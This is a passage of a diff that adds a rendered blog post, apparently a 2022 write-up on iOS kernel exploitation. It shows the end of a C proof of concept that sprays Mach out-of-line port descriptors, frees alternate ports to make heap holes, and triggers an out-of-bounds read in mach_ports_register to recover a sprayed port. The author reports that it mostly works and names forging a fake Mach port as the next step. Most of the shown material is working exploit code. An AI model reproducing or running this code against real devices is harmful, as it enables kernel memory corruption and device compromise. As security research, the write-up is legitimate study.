+    InP<span style="color:#f92672">-&gt;</span>msgh_body.msgh_descriptor_count <span style="color:#f92672">=</span> num;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num; i<span style="color:#f92672">++</span>) {
+        InP<span style="color:#f92672">-&gt;</span>init_port_set[i].address <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(init_port_set);
+        InP<span style="color:#f92672">-&gt;</span>init_port_set[i].count <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+        InP<span style="color:#f92672">-&gt;</span>init_port_set[i].disposition <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span>;
+        InP<span style="color:#f92672">-&gt;</span>init_port_set[i].deallocate <span style="color:#f92672">=</span> FALSE;
+        InP<span style="color:#f92672">-&gt;</span>init_port_set[i].type <span style="color:#f92672">=</span> MACH_MSG_OOL_PORTS_DESCRIPTOR;
+        InP<span style="color:#f92672">-&gt;</span>init_port_set[i].copy <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    }
+    InP<span style="color:#f92672">-&gt;</span>Head.msgh_bits <span style="color:#f92672">=</span> MACH_MSGH_BITS_COMPLEX <span style="color:#f92672">|</span> MACH_MSGH_BITS(<span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">0</span>);
+    InP<span style="color:#f92672">-&gt;</span>Head.msgh_request_port <span style="color:#f92672">=</span> target;
+    InP<span style="color:#f92672">-&gt;</span>Head.msgh_reply_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    InP<span style="color:#f92672">-&gt;</span>Head.msgh_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>;
+    assert(mach_msg(<span style="color:#f92672">&amp;</span>InP<span style="color:#f92672">-&gt;</span>Head, MACH_SEND_MSG<span style="color:#f92672">|</span>MACH_MSG_OPTION_NONE, (mach_msg_size_t)<span style="color:#66d9ef">sizeof</span>(Request)<span style="color:#f92672">+</span>num<span style="color:#f92672">*</span><span style="color:#66d9ef">sizeof</span>(mach_msg_ool_ports_descriptor_t), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+    
+    <span style="color:#66d9ef">return</span> target;
+}
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+    mach_msg_header_t Head;
+    mach_msg_body_t msgh_body;
+    mach_msg_ool_ports_descriptor_t init_port_set;
+} Request;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">release</span>(mach_port_t port) {
+    <span style="color:#66d9ef">char</span> req[<span style="color:#ae81ff">0x1000</span>];
+    assert(mach_msg((mach_msg_header_t<span style="color:#f92672">*</span>)req, MACH_RCV_MSG, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(req), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+}
+
+mach_port_t <span style="color:#a6e22e">exploit</span>(<span style="color:#66d9ef">void</span>) {
+    mach_port_t fp[<span style="color:#ae81ff">1024</span>] <span style="color:#f92672">=</span> {MACH_PORT_NULL};
+    mach_port_t port_array[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {MACH_PORT_NULL};
+    mach_port_t <span style="color:#f92672">*</span>returned_ports <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    mach_msg_type_number_t sz <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+    
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, <span style="color:#f92672">&amp;</span>port_array[<span style="color:#ae81ff">0</span>]);
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, <span style="color:#f92672">&amp;</span>port_array[<span style="color:#ae81ff">1</span>]);
+    mach_port_insert_right(mach_task_self(), port_array[<span style="color:#ae81ff">0</span>], port_array[<span style="color:#ae81ff">0</span>], MACH_MSG_TYPE_MAKE_SEND);
+    mach_port_insert_right(mach_task_self(), port_array[<span style="color:#ae81ff">1</span>], port_array[<span style="color:#ae81ff">1</span>], MACH_MSG_TYPE_MAKE_SEND);
+
+    
+    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1024</span>; i<span style="color:#f92672">++</span>) {
+        fp[i] <span style="color:#f92672">=</span> spray(<span style="color:#ae81ff">1</span>);
+    }
+    
+    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1024</span>; i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>) {
+        release(fp[i]);
+    }
+    
+    reg(port_array,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>);
+    mach_ports_lookup(mach_task_self(), <span style="color:#f92672">&amp;</span>returned_ports, <span style="color:#f92672">&amp;</span>sz);
+    
+    mach_port_t fake <span style="color:#f92672">=</span> returned_ports[<span style="color:#ae81ff">2</span>];
+    <span style="color:#66d9ef">return</span> (fake <span style="color:#f92672">==</span> dummy);
+}
+</code></pre></div><p>I decided to use the OOB vulnerability since I don&rsquo;t know much about good kernel heap structures. In this POC, I tried to receive the <code>dummy</code> port from the OOB in <code>mach_ports_register</code> with <code>mach_ports_lookup</code> (MIG function to acquire the ports from <code>mach_ports_register</code>), which was sprayed all over the heap zone where our OOL ports descriptor is located. I free&rsquo;d every second port to create &ldquo;holes&rdquo;. We want our allocated ports from <code>reg</code> to be placed in front of an allocated <code>dummy</code> port, So <code>mach_ports_register</code> can access a valid mach port OOB. After we call <code>mach_ports_lookup</code> we can receive the OOB port and compare it if we got the right port.</p>
+<p><img src="https://raw.githubusercontent.com/b17fr13nds/iOS-programming/main/static/step16_pocsuccess.png" alt="step16"></p>
+<p>As you can see, the exploit works! Sometimes the exploit and the iDevice crashes (You can see the kernel panic logs at <code>Settings &gt; Privacy &gt; Diagnostics &amp; Usage &gt; Diagnostic &amp; Usage Data</code>), but it works mostly. We verified that our OOB port is the same as the <code>dummy</code> port. Now, if we can spray user-controlled data in the same zone where our OOL port lies, we can get a fake mach port! Maybe I will release a complete jailbreak in the future.</p>
+<h4 id="sources">Sources</h4>
+<p>[1]: <a href="https://www.exploit-db.com/papers/13176">https://www.exploit-db.com/papers/13176</a>
+[2]: <a href="https://dmcyk.xyz/post/xnu_ipc_iii_ool_data/">https://dmcyk.xyz/post/xnu_ipc_iii_ool_data/</a>
+[3]: <a href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html">https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html</a>
+[4]: <a href="https://gist.github.com/Siguza/96ae6d6806e974199b1d44ffffca5331">https://gist.github.com/Siguza/96ae6d6806e974199b1d44ffffca5331</a></p>
+<h5 id="acknowledgement">Acknowledgement</h5>
+<p>Thanks to Siguza for his exploit I could take as a referance and for helping me!</p>
+</div>
+				
+			</article>
+		</div>
+	</main>
+	
+	
+
+
+
+	
+
+	</div>
+	<footer class="footer">
+	<div class="footer__copyright">© 2022 BitFriends&#39; blog. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+</body>
+</html>
